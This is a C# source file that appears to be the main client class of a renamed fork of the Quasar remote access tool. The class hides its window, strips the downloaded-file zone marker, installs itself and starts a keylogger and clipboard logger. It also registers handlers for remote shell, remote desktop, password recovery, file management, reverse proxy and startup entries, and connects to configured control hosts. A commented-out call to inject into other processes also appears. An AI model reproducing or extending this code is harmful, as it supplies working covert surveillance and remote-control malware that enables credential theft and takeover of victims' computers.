using Ton618.MessageHandlers;
using Ton618.Setup;
using Q3C273.Shared.DNS;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;
using Q3C273.Shared.Helpers;
using Q3C273.Shared.Messages;
using Ton618.Networking;
using Ton618.Logging;
using Ton618.Utilities;
using Ton618.Config;
using Ton618.User;
using Ton618.Loader;
using System.Text;
using System.Linq;
using Q3C273.Shared.Cryptography;

namespace Ton618
{
    /// <summary>
    /// The client application which handles basic bootstrapping of the message processors and background tasks.
    /// </summary>
    public class QuasarApplication : Form
    {
        /// <summary>
        /// A system-wide mutex that ensures that only one instance runs at a time.
        /// </summary>
        public SingleInstanceMutex ApplicationMutex { get; set; }

        /// <summary>
        /// The client used for the connection to the server.
        /// </summary>
        private QuasarClient connectClient;

        /// <summary>
        /// List of <see cref="IMessageProcessor"/> to keep track of all used message processors.
        /// </summary>
        private readonly List<IMessageProcessor> messageProcessors;

        /// <summary>
        /// The background keylogger service used to capture and store keystrokes.
        /// </summary>
        private KeyloggerService keyloggerService;

        private Cliplogger clipLogger;

        /// <summary>
        /// Keeps track of the user activity.
        /// </summary>
        private ActivityDetection userActivityDetection;

        /// <summary>
        /// Determines whether an installation is required depending on the current and target paths.
        /// </summary>
        private bool IsInstallationRequired => Settings.INSTALL && Settings.INSTALLPATH != Application.ExecutablePath;

        /// <summary>
        /// Notification icon used to show notifications in the taskbar.
        /// </summary>
        private readonly NotifyIcon notifyIcon;

        /// <summary>
        /// Initializes a new instance of the <see cref="QuasarApplication"/> class.
        /// </summary>
        public QuasarApplication()
        {
            messageProcessors = new List<IMessageProcessor>();
            notifyIcon = new NotifyIcon();
        }

        /// <summary>
        /// Starts the application.
        /// </summary>
        /// <param name="e">An System.EventArgs that contains the event data.</param>
        protected override void OnLoad(EventArgs e)
        {
            Visible = false;
            ShowInTaskbar = false;
            Run();
            base.OnLoad(e);
        }

        /// <summary>
        /// Initializes the notification icon.
        /// </summary>
        private void InitializeNotifyicon()
        {
            notifyIcon.Text = "Quasar Client\nNo connection";
            notifyIcon.Visible = true;
            try
            {
                notifyIcon.Icon = Icon.ExtractAssociatedIcon(Assembly.GetExecutingAssembly().Location);
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex);
                notifyIcon.Icon = SystemIcons.Application;
            }
        }

        /// <summary>
        /// Begins running the application.
        /// </summary>
        public void Run()
        {
            //var input = StringHelper.GetRandomString(100);
            //
            //var encoded = Alphabet.Base95Alphabet.GetString(Encoding.UTF8.GetBytes(input));
            //var reencstr = Encoding.UTF8.GetString(Alphabet.Base95Alphabet.GetBytes(encoded).ToArray());
            //MessageBox.Show("Input string: " + input + "\nInput hash: " + Sha256.ComputeHash(input) + "\nInput encoded: " + encoded + "\nInput encoded-decoded: " + reencstr + "\nRe-encoded hash: " + Sha256.ComputeHash(reencstr));

            //new SlaveInjector().FindAndInject();

            // decrypt and verify the settings
            if (!Settings.Initialize())
            {
                Environment.Exit(1);
            }

            ApplicationMutex = new SingleInstanceMutex(Settings.MUTEX);

            // check if process with same mutex is already running on system
            if (!ApplicationMutex.CreatedNew)
                Environment.Exit(2);

            FileHelper.DeleteZoneIdentifier(Application.ExecutablePath);

            var installer = new ClientInstaller();

            if (IsInstallationRequired)
            {
                // close mutex before installing the client
                ApplicationMutex.Dispose();

                try
                {
                    installer.Install();
                    Environment.Exit(3);
                }
                catch (Exception e)
                {
                    Debug.WriteLine(e);
                }
            }
            else
            {
                try
                {
                    // (re)apply settings and proceed with connect loop
                    installer.ApplySettings();
                }
                catch (Exception e)
                {
                    Debug.WriteLine(e);
                }

                if (!Settings.UNATTENDEDMODE)
                    InitializeNotifyicon();

                if (Settings.ENABLELOGGER)
                {
                    keyloggerService = new KeyloggerService();
                    keyloggerService.Start();

                    clipLogger = new Cliplogger(Settings.ClipLogCaptureInterval, Settings.ClipLogFlushInterval, Settings.ClipLogRollSize);
                    clipLogger.Start();
                }

                var hosts = new HostsManager(new HostsConverter().RawHostsToList(Settings.HOSTS));
                connectClient = new QuasarClient(hosts, Settings.SERVERCERTIFICATE);
                connectClient.ClientState += ConnectClientOnClientState;
                InitializeMessageProcessors(connectClient);

                userActivityDetection = new ActivityDetection(connectClient);
                userActivityDetection.Start();

                new Thread(() =>
                {
                    // Start connection loop on new thread and dispose application once client exits.
                    // This is required to keep the UI thread responsive and run the message loop.
                    connectClient.ConnectLoop();
                    Environment.Exit(0);
                }).Start();
            }
        }

        private void ConnectClientOnClientState(Client s, bool connected)
        {
            if (connected)
                notifyIcon.Text = "Quasar Client\nConnection established";
            else
                notifyIcon.Text = "Quasar Client\nNo connection";
        }

        /// <summary>
        /// Adds all message processors to <see cref="messageProcessors"/> and registers them in the <see cref="MessageHandler"/>.
        /// </summary>
        /// <param name="client">The client which handles the connection.</param>
        /// <remarks>Always initialize from UI thread.</remarks>
        private void InitializeMessageProcessors(QuasarClient client)
        {
            messageProcessors.Add(new ClientServicesHandler(this, client));
            messageProcessors.Add(new FileManagerHandler(client));
            messageProcessors.Add(new KeyloggerHandler());
            messageProcessors.Add(new MessageBoxHandler());
            messageProcessors.Add(new PasswordRecoveryHandler());
            messageProcessors.Add(new RegistryHandler());
            messageProcessors.Add(new RemoteDesktopHandler());
            messageProcessors.Add(new RemoteShellHandler(client));
            messageProcessors.Add(new ReverseProxyHandler(client));
            messageProcessors.Add(new ShutdownHandler());
            messageProcessors.Add(new StartupManagerHandler());
            messageProcessors.Add(new SystemInformationHandler());
            messageProcessors.Add(new TaskManagerHandler(client));
            messageProcessors.Add(new TcpConnectionsHandler());
            messageProcessors.Add(new WebsiteVisitorHandler());

            foreach (var msgProc in messageProcessors)
            {
                MessageHandler.Register(msgProc);
                if (msgProc is NotificationMessageProcessor notifyMsgProc)
                    notifyMsgProc.ProgressChanged += ShowNotification;
            }
        }

        /// <summary>
        /// Disposes all message processors of <see cref="messageProcessors"/> and unregisters them from the <see cref="MessageHandler"/>.
        /// </summary>
        private void CleanupMessageProcessors()
        {
            foreach (var msgProc in messageProcessors)
            {
                MessageHandler.Unregister(msgProc);
                if (msgProc is NotificationMessageProcessor notifyMsgProc)
                    notifyMsgProc.ProgressChanged -= ShowNotification;
                if (msgProc is IDisposable disposableMsgProc)
                    disposableMsgProc.Dispose();
            }
        }

        private void ShowNotification(object sender, string value)
        {
            if (Settings.UNATTENDEDMODE)
                return;

            notifyIcon.ShowBalloonTip(4000, "Quasar Client", value, ToolTipIcon.Info);
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                CleanupMessageProcessors();
                keyloggerService?.Dispose();
                clipLogger?.Dispose();
                userActivityDetection?.Dispose();
                ApplicationMutex?.Dispose();
                connectClient?.Dispose();
                notifyIcon.Visible = false;
                notifyIcon.Dispose();
            }
            base.Dispose(disposing);
        }
    }
}
